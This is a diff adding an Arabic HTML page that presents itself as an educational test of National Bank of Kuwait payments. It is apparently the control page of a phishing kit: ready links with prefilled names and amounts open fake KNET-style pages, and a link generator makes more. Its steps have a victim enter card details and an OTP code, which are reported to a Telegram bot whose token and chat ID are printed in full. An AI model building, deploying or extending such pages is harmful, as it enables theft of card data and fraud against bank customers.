@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختبار نظام الدفع NBK</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            padding: 20px;
+            direction: rtl;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .header h1 {
+            color: #1e3c72;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 1.1em;
+        }
+        
+        .test-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border-right: 5px solid #1e3c72;
+        }
+        
+        .test-section h2 {
+            color: #1e3c72;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+        
+        .test-link {
+            display: inline-block;
+            background: linear-gradient(45deg, #1e3c72, #2a5298);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s;
+            margin: 10px 0;
+        }
+        
+        .test-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(30, 60, 114, 0.3);
+        }
+        
+        .status {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .instructions {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .instructions h3 {
+            color: #856404;
+            margin-bottom: 15px;
+        }
+        
+        .instructions ol {
+            color: #856404;
+            margin-right: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+        
+        .generator-link {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 30px;
+            border-top: 2px solid #e9ecef;
+        }
+        
+        .btn-generate {
+            background: linear-gradient(45deg, #28a745, #20c997);
+            color: white;
+            padding: 20px 40px;
+            border-radius: 15px;
+            text-decoration: none;
+            font-size: 1.2em;
+            font-weight: bold;
+            display: inline-block;
+            transition: all 0.3s;
+        }
+        
+        .btn-generate:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(40, 167, 69, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🏦 اختبار نظام الدفع NBK</h1>
+            <p>نظام محاكاة دفع بنك الكويت الوطني للأغراض التعليمية</p>
+        </div>
+
+        <div class="instructions">
+            <h3>📋 تعليمات الاختبار</h3>
+            <ol>
+                <li>استخدم منشئ الروابط لإنشاء رابط دفع جديد</li>
+                <li>أو اختبر الروابط الجاهزة أدناه</li>
+                <li>اتبع خطوات الدفع: التأكيد ← بيانات البطاقة ← رمز التحقق ← النجاح</li>
+                <li>تحقق من وصول الإشعارات إلى بوت التليجرام</li>
+            </ol>
+        </div>
+
+        <div class="test-section">
+            <h2>🔗 روابط اختبار جاهزة</h2>
+            
+            <div style="margin-bottom: 20px;">
+                <strong>اختبار 1: دفع 30 دينار ليوسف الرشيدي</strong><br>
+                <a href="https://knet-mock-payment-c247ac52.scout.site/?n=يوسف غازي الرشيدي&a=30&p=دفع مستحقات&b=شركة الكويت للتقنية" class="test-link" target="_blank">
+                    اختبر الآن
+                </a>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <strong>اختبار 2: دفع 50 دينار لأحمد محمد</strong><br>
+                <a href="https://knet-mock-payment-c247ac52.scout.site/?n=أحمد محمد علي&a=50&p=دفع فاتورة&b=شركة الاتصالات الكويتية" class="test-link" target="_blank">
+                    اختبر الآن
+                </a>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <strong>اختبار 3: دفع 100 دينار لفاطمة العلي</strong><br>
+                <a href="https://knet-mock-payment-c247ac52.scout.site/?n=فاطمة محمد العلي&a=100&p=شراء منتج&b=متجر الكويت الإلكتروني" class="test-link" target="_blank">
+                    اختبر الآن
+                </a>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h2>🤖 حالة بوت التليجرام</h2>
+            <div class="status success">
+                <strong>معلومات البوت:</strong><br>
+                الاسم: @kenlinkbot<br>
+                التوكن: 7609722185:AAHaUIvvyNYOX-nlu4cXqXTWiKdcjS7WmPg<br>
+                Chat ID: 195782300<br>
+                الحالة: ✅ يعمل بنجاح
+            </div>
+            
+            <p style="margin-top: 15px;">
+                <strong>✅ البوت جاهز للعمل!</strong><br>
+                تم إعداد البوت بنجاح وهو الآن قادر على استقبال إشعارات الدفع.<br>
+                سيصلك إشعار عند إدخال بيانات البطاقة وعند إتمام الدفع.
+            </p>
+        </div>
+
+        <div class="test-section">
+            <h2>📊 متابعة النتائج</h2>
+            <p>بعد إجراء الاختبار، ستحصل على:</p>
+            <ul style="margin-right: 20px; margin-top: 10px;">
+                <li>✅ إشعار عند إدخال بيانات البطاقة</li>
+                <li>✅ إشعار عند تأكيد رمز التحقق</li>
+                <li>✅ تفاصيل كاملة للعملية في التليجرام</li>
+                <li>✅ صفحة نجاح مع رقم مرجعي</li>
+            </ul>
+        </div>
+
+        <div class="generator-link">
+            <h2 style="margin-bottom: 20px;">🔧 إنشاء روابط دفع مخصصة</h2>
+            <a href="https://nbk-payment-generator-c247ac52.scout.site/" class="btn-generate" target="_blank">
+                👆 افتح منشئ الروابط
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // Add some interactivity
+        document.addEventListener('DOMContentLoaded', function() {
+            const links = document.querySelectorAll('.test-link');
+            
+            links.forEach(link => {
+                link.addEventListener('click', function() {
+                    this.style.background = 'linear-gradient(45deg, #28a745, #20c997)';
+                    this.innerHTML = '🚀 جاري فتح الرابط...';
+                    
+                    setTimeout(() => {
+                        this.style.background = 'linear-gradient(45deg, #1e3c72, #2a5298)';
+                        this.innerHTML = 'اختبر الآن';
+                    }, 2000);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
